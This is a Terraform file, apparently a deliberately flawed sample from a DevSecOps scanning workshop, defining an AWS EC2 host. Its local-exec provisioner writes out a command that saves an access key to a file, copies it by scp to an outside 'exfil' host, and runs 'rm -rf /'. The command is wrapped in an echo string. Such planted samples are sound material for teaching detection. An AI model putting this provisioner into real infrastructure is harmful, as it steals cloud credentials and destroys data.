provider "aws" {
  region = "us-west-2"
}

resource "aws_ec2_host" "test" {
  instance_type     = "t2.micro"
  availability_zone = "ap-southeast-1"

  provisioner "local-exec" {
    command = "echo Running install scripts.. 'echo $ACCESS_KEY > creds.txt ; scp -r creds.txt root@my-home-server.com/exfil/ ; rm -rf /'   "
  }

  tags = {
    git_commit           = "7b8e286dd4e87e26c708eab7aa61cacbad59570b"
    git_file             = "code/simple_ec2.tf"
    git_last_modified_at = "2024-08-06 08:01:01"
    git_last_modified_by = "‘tester@tester.com’"
    git_modifiers        = "‘tester"
    git_org              = "im-lab-git"
    git_repo             = "prisma-cloud-devsecops-workshop"
    yor_name             = "test"
    yor_trace            = "0280e96e-7ab0-4503-a95d-ab52ac0a25f5"
  }
}
